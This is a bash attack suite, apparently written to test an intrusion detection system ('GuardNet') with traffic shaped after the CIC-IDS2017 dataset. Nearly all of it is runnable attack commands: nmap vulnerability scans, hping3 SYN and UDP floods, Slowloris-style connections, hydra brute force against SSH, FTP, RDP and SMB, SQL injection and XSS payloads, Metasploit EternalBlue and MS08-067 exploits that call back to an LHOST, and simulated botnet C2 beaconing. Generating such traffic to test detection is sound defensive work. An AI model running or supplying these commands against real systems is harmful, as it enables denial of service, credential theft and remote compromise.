#!/bin/bash
# GuardNet IDS Attack Suite — run from Kali Linux VM as root
# Config: /home/kali/guardnet.conf (persistent, edit once)
# Usage:  sudo bash ~/attack_test.sh [category]
#   category: all | portscan | dos | ddos | bruteforce | webattack | infiltration | botnet
# Example: sudo bash ~/attack_test.sh all

# ─── Load config ──────────────────────────────────────────────
CONF="/home/kali/Desktop/guardnet.conf"
[ -f "$CONF" ] || CONF="/home/kali/guardnet.conf"
if [ ! -f "$CONF" ]; then
    echo "[!] Config not found: $CONF"
    echo "    Create it with: TARGET=x.x.x.x, IDS_URL=..., LHOST=..., WORDLIST=..."
    exit 1
fi
# Strip inline comments before sourcing
eval "$(grep -v '^\s*#' "$CONF" | grep '=' | sed 's/\s*#.*//')"

MODE="${1:-all}"
LOGDIR="/tmp/guardnet_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOGDIR"

pass() { echo -e "\e[32m[+]\e[0m $*"; }
fail() { echo -e "\e[31m[-]\e[0m $*"; }
info() { echo -e "\e[36m[*]\e[0m $*"; }
skip() { echo -e "\e[33m[!]\e[0m $* — skipping"; }
hdr()  { echo ""; echo -e "\e[1m=== $* ===\e[0m"; }
need() { command -v "$1" &>/dev/null; }

info "Target:    $TARGET"
info "IDS:       $IDS_URL  ($IDS_CREDS)"
info "Log dir:   $LOGDIR"
info "Mode:      $MODE"
echo ""

ids_check() {
    curl -s --max-time 5 --interface eth1 -u "$IDS_CREDS" "$IDS_URL/api/status" 2>/dev/null \
        | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'  attacks={d[\"total_attacks\"]}  blocked={d[\"blocked\"]}')" 2>/dev/null \
        || echo "  (dashboard unreachable)"
}

run_category() {
    local cat="$1"
    case "$cat" in

    # ── PORTSCAN ──────────────────────────────────────────────
    portscan)
        hdr "PORTSCAN — nmap SYN scan (many short flows, high SYN/RST)"

        info "Fast full-port SYN scan → large flow count burst"
        nmap -sS -T4 -p- --min-rate 2000 "$TARGET" \
            -oN "$LOGDIR/ps_fullscan.txt" 2>&1 | tail -4

        sleep "$DELAY"

        info "Service + OS detection on common Windows ports"
        nmap -sV -O -T4 -p 21,22,23,80,135,139,443,445,1433,3389,5985 "$TARGET" \
            -oN "$LOGDIR/ps_service.txt" 2>&1 | tail -6

        sleep "$DELAY"

        info "SMB OS + share enumeration"
        nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users \
            "$TARGET" -oN "$LOGDIR/ps_smb_enum.txt" 2>&1 | tail -8 || true

        sleep "$DELAY"

        info "Vuln scripts: EternalBlue + MS08-067 + RDP"
        nmap -p 445,3389 \
            --script smb-vuln-ms17-010,smb-vuln-ms08-067,rdp-vuln-ms12-020 \
            "$TARGET" -oN "$LOGDIR/ps_vulns.txt" 2>&1 | tail -10 || true
        ;;

    # ── DOS ───────────────────────────────────────────────────
    # CIC-IDS2017 DoS: Hulk / GoldenEye / Slowloris / SlowHTTPTest
    # Features: high Flow Bytes/s, many fwd packets, high PSH/ACK flags
    dos)
        hdr "DoS — HTTP floods matching Hulk/GoldenEye/Slowloris training data"

        info "Hulk-style HTTP flood (high-rate randomised GET, port 80)"
        if need goldeneye; then
            timeout 20 goldeneye "http://$TARGET/" -w 50 2>&1 | tail -4 || true
        else
            # Manual Hulk-style: many concurrent curls with random cache-busters
            for i in $(seq 1 400); do
                curl -s -o /dev/null --connect-timeout 1 \
                    -H "Cache-Control: no-cache" \
                    -H "Pragma: no-cache" \
                    "http://$TARGET/?$(head -c8 /dev/urandom | base64)" 2>/dev/null &
                [ $((i % 50)) -eq 0 ] && wait   # throttle fork count
            done
            wait
            pass "400 randomised HTTP GETs sent"
        fi

        sleep "$DELAY"

        info "GoldenEye-style KeepAlive DoS (long-lived connections)"
        for i in $(seq 1 80); do
            curl -s -o /dev/null --connect-timeout 2 --max-time 15 \
                -H "Connection: keep-alive" \
                -H "Keep-Alive: 900" \
                "http://$TARGET/" 2>/dev/null &
        done
        wait
        pass "80 KeepAlive connections exhausted"

        sleep "$DELAY"

        info "Slowloris-style (slow header send via hping3 + netcat)"
        if need slowhttptest; then
            timeout 25 slowhttptest -c 200 -H -g \
                -o "$LOGDIR/dos_slowloris" -i 10 -r 20 -t GET \
                -u "http://$TARGET/" 2>&1 | tail -5 || true
        else
            # Simulate: open many half-complete HTTP connections
            for i in $(seq 1 60); do
                (echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nX-a: b" \
                 | timeout 12 nc -w 12 "$TARGET" 80 &>/dev/null) &
            done
            sleep 12; wait
            pass "60 slow-header connections held open for 12s"
        fi

        sleep "$DELAY"

        info "SYN flood to port 80 (hping3)"
        timeout 10 hping3 -S --flood -p 80 "$TARGET" 2>&1 | tail -3 || true
        ;;

    # ── DDOS ──────────────────────────────────────────────────
    # CIC-IDS2017 DDoS: LOIC UDP + HOIC HTTP
    # Features: very high Flow Packets/s, short IAT, large fwd packet counts
    ddos)
        hdr "DDoS — LOIC-style UDP + ICMP + TCP floods"

        info "UDP flood port 80 (LOIC UDP mode, 2000 pkts)"
        timeout 10 hping3 --udp --flood -p 80 "$TARGET" -c 2000 2>&1 | tail -3 || true

        sleep "$DELAY"

        info "UDP flood port 53 (DNS amplification pattern)"
        timeout 10 hping3 --udp --flood -p 53 "$TARGET" -c 2000 2>&1 | tail -3 || true

        sleep "$DELAY"

        info "ICMP flood (ping flood, 1000 packets)"
        timeout 10 ping -f -c 1000 "$TARGET" 2>&1 | tail -3 || true

        sleep "$DELAY"

        info "TCP SYN flood multi-port (HOIC pattern, high rate)"
        for port in 80 443 8080 8443; do
            timeout 6 hping3 -S --flood -p "$port" "$TARGET" &
        done
        sleep 6; wait
        pass "SYN flood on 4 ports simultaneously (HOIC-style)"

        sleep "$DELAY"

        info "UDP flood port 137 (NetBIOS, Windows-targeted DDoS)"
        timeout 10 hping3 --udp --flood -p 137 "$TARGET" -c 1500 2>&1 | tail -3 || true
        ;;

    # ── BRUTEFORCE ────────────────────────────────────────────
    # CIC-IDS2017: SSH-Patator, FTP-Patator
    # Features: many flows to same dst_port, short duration, auth failure pattern
    bruteforce)
        hdr "BruteForce — SSH-Patator + FTP-Patator style"

        if ! [ -f "$WORDLIST" ]; then
            fail "Wordlist not found: $WORDLIST"
            WORDLIST="$SMALL_WORDLIST"
            info "Falling back to: $SMALL_WORDLIST"
        fi

        info "SSH brute force (SSH-Patator style, port 22)"
        if need hydra; then
            timeout 40 hydra -l Administrator -P "$SMALL_WORDLIST" \
                -t 8 -f "$TARGET" ssh 2>&1 | tail -6 || true
            timeout 20 hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
                -p password -t 8 "$TARGET" ssh 2>&1 | tail -4 || true
        else
            skip "hydra"
        fi

        sleep "$DELAY"

        info "FTP brute force (FTP-Patator style, port 21)"
        if need hydra; then
            timeout 30 hydra -l Administrator -P "$SMALL_WORDLIST" \
                -t 4 -f "$TARGET" ftp 2>&1 | tail -5 || true
        else
            skip "hydra"
        fi

        sleep "$DELAY"

        info "RDP brute force (port 3389)"
        if need hydra; then
            timeout 30 hydra -l Administrator -P "$SMALL_WORDLIST" \
                -t 2 -f rdp://"$TARGET" 2>&1 | tail -5 || true
        else
            skip "hydra"
        fi

        sleep "$DELAY"

        info "SMB brute force (port 445)"
        if need hydra; then
            timeout 30 hydra -l Administrator -P "$SMALL_WORDLIST" \
                -t 4 -f smb://"$TARGET" 2>&1 | tail -5 || true
        else
            skip "hydra"
        fi

        sleep "$DELAY"

        # Pure TCP-level brute simulation: rapid auth probes on port 22
        info "Rapid TCP auth probes (low-level SSH-Patator simulation)"
        for i in $(seq 1 80); do
            (echo -e "SSH-2.0-OpenSSH_Patator\r\n" \
             | timeout 2 nc -w 2 "$TARGET" 22 &>/dev/null) &
        done
        wait
        pass "80 SSH banner probes sent"
        ;;

    # ── WEBATTACK ─────────────────────────────────────────────
    # CIC-IDS2017: Web Brute Force, SQL Injection, XSS (all HTTP/HTTPS)
    # Features: dst_port 80/443, varying payload sizes, PSH flags
    webattack)
        hdr "WebAttack — SQL injection + XSS + web brute force"

        info "Web vulnerability scan (nikto)"
        if need nikto; then
            timeout 30 nikto -h "http://$TARGET/" \
                -o "$LOGDIR/web_nikto.txt" 2>&1 | tail -8 || true
        else
            skip "nikto — apt install nikto"
        fi

        sleep "$DELAY"

        info "SQL injection probe (sqlmap)"
        if need sqlmap; then
            timeout 30 sqlmap -u "http://$TARGET/?id=1" \
                --batch --level=3 --risk=2 \
                --output-dir="$LOGDIR/sqlmap" 2>&1 | tail -8 || true
        else
            skip "sqlmap"
        fi

        sleep "$DELAY"

        info "Manual SQL injection payloads via curl (match training data)"
        SQL_PAYLOADS=(
            "' OR '1'='1"
            "1; DROP TABLE users--"
            "' UNION SELECT 1,2,3--"
            "admin'--"
            "1' AND 1=1--"
            "' OR 1=1#"
        )
        for payload in "${SQL_PAYLOADS[@]}"; do
            curl -s -o /dev/null --connect-timeout 2 \
                "http://$TARGET/?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" &
            curl -s -o /dev/null --connect-timeout 2 -X POST \
                -d "username=$payload&password=test" "http://$TARGET/login" &
        done
        wait
        pass "${#SQL_PAYLOADS[@]} SQL injection payloads sent"

        sleep "$DELAY"

        info "XSS payloads via HTTP GET (Web Attack XSS training pattern)"
        XSS_PAYLOADS=(
            "<script>alert(1)</script>"
            "<img src=x onerror=alert(1)>"
            "javascript:alert(document.cookie)"
            "<svg onload=alert(1)>"
        )
        for payload in "${XSS_PAYLOADS[@]}"; do
            for i in $(seq 1 5); do
                curl -s -o /dev/null --connect-timeout 2 \
                    "http://$TARGET/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" &
            done
        done
        wait
        pass "${#XSS_PAYLOADS[@]} XSS payloads sent"

        sleep "$DELAY"

        info "Web auth brute force (HTTP Basic + form, match Web BruteForce training)"
        if need hydra; then
            timeout 20 hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
                -P "$SMALL_WORDLIST" -t 8 -f \
                "http-get://$TARGET/" 2>&1 | tail -5 || true
        else
            # Manual rapid HTTP auth attempts
            for i in $(seq 1 100); do
                curl -s -o /dev/null --connect-timeout 1 \
                    -u "admin:password$i" "http://$TARGET/" &
                [ $((i % 20)) -eq 0 ] && wait
            done
            wait
            pass "100 HTTP Basic auth attempts sent"
        fi
        ;;

    # ── INFILTRATION ─────────────────────────────────────────
    # CIC-IDS2017: Cool Disk + internal portscan after initial foothold
    # Features: low-and-slow, internal traffic, unusual ports, small flows
    infiltration)
        hdr "Infiltration — EternalBlue/MS08-067 + post-exploit patterns"

        info "EternalBlue check (MS17-010 SMB vuln scan)"
        nmap -p 445 --script smb-vuln-ms17-010 "$TARGET" \
            -oN "$LOGDIR/infil_eternalblue_check.txt" 2>&1 | tail -8 || true

        sleep "$DELAY"

        info "EternalBlue exploit attempt (MS17-010 — msfconsole)"
        if need msfconsole; then
            msfconsole -q -x "
                use exploit/windows/smb/ms17_010_eternalblue;
                set RHOSTS $TARGET;
                set LHOST $LHOST;
                set LPORT $LPORT_BASE;
                set ExitOnSession false;
                run -j;
                sleep 15;
                sessions -K;
                exit -y
            " 2>&1 | grep -E 'Started|session|exploit|FAILED|Exploit' | head -15 || true
        else
            skip "msfconsole — apt install metasploit-framework"
        fi

        sleep "$DELAY"

        info "MS08-067 Netapi exploit attempt (Win XP/Vista/7)"
        if need msfconsole; then
            msfconsole -q -x "
                use exploit/windows/smb/ms08_067_netapi;
                set RHOSTS $TARGET;
                set LHOST $LHOST;
                set LPORT $((LPORT_BASE+1));
                set ExitOnSession false;
                run -j;
                sleep 15;
                sessions -K;
                exit -y
            " 2>&1 | grep -E 'Started|session|exploit|FAILED|Exploit' | head -15 || true
        else
            skip "msfconsole"
        fi

        sleep "$DELAY"

        info "BlueKeep RDP scan (CVE-2019-0708, Win7/2008)"
        if need msfconsole; then
            msfconsole -q -x "
                use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;
                set RHOSTS $TARGET;
                run;
                exit -y
            " 2>&1 | grep -E 'VULNERABLE|safe|NOT' | head -5 || true
        fi

        sleep "$DELAY"

        info "Low-and-slow internal recon (Infiltration IAT pattern)"
        # Simulate post-exploit internal scan: slow periodic probes
        for port in 21 22 23 25 53 80 110 135 139 443 445 3389; do
            timeout 2 bash -c "echo '' | nc -w 2 $TARGET $port" &>/dev/null &
            sleep 0.4
        done
        wait
        pass "Low-and-slow port probe complete (12 ports @ 400ms interval)"
        ;;

    # ── BOTNET ────────────────────────────────────────────────
    # CIC-IDS2017: ARES botnet — periodic C2 beaconing
    # Features: regular small flows, consistent IAT, port 8080/443/6667, small payloads
    botnet)
        hdr "Botnet — ARES-style C2 beaconing (periodic small flows)"

        info "Simulating ARES botnet beacon pattern (30s, 2s interval)"
        C2_PORTS=(8080 443 6667 1080 4444)
        END=$((SECONDS + 30))
        BEACON=0
        while [ $SECONDS -lt $END ]; do
            PORT="${C2_PORTS[$((BEACON % ${#C2_PORTS[@]}))]}"
            # Small periodic connection — matches ARES beacon size (~200 bytes)
            (printf "GET /gate.php?uid=bot_%s&ver=1.0 HTTP/1.1\r\nHost: %s\r\n\r\n" \
                "$(hostname)" "$TARGET" \
             | timeout 1 nc -w 1 "$TARGET" "$PORT" &>/dev/null) &
            BEACON=$((BEACON+1))
            sleep 2
        done
        wait
        pass "~15 beacon cycles sent (ARES C2 pattern)"

        sleep "$DELAY"

        info "IRC-style botnet traffic (port 6667 command channel)"
        for i in $(seq 1 20); do
            (printf "NICK bot%d\r\nUSER bot%d 0 * :bot\r\nJOIN #control\r\n" \
                "$i" "$i" \
             | timeout 2 nc -w 2 "$TARGET" 6667 &>/dev/null) &
            sleep 0.5
        done
        wait
        pass "20 IRC channel join attempts (bot C2 pattern)"

        sleep "$DELAY"

        info "HTTP-based C2 beaconing (port 80, randomised intervals like ARES)"
        for i in $(seq 1 25); do
            curl -s -o /dev/null --connect-timeout 1 \
                -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" \
                "http://$TARGET/gate.php?uid=infected_$(hostname)&req=cmd" 2>/dev/null &
            sleep $(awk "BEGIN{print 0.8+$i*0.1-int($i*0.1)}")
        done
        wait
        pass "25 HTTP C2 beacon requests sent"
        ;;

    *)
        fail "Unknown category: $cat"
        echo "  Valid: all | portscan | dos | ddos | bruteforce | webattack | infiltration | botnet"
        exit 1
        ;;
    esac

    info "IDS status after $cat:"
    ids_check
    echo ""
}

# ─── Run ──────────────────────────────────────────────────────
if [ "$MODE" = "all" ]; then
    for CAT in portscan dos ddos bruteforce webattack infiltration botnet; do
        run_category "$CAT"
        sleep "$DELAY"
    done
else
    run_category "$MODE"
fi

echo ""
echo "════════════════════════════════════════"
pass "All attacks complete. Logs: $LOGDIR"
echo ""
info "Dashboard: $IDS_URL  (${IDS_CREDS%%:*} / ${IDS_CREDS##*:})"
info "API:       curl -u $IDS_CREDS $IDS_URL/api/alerts"
echo "════════════════════════════════════════"
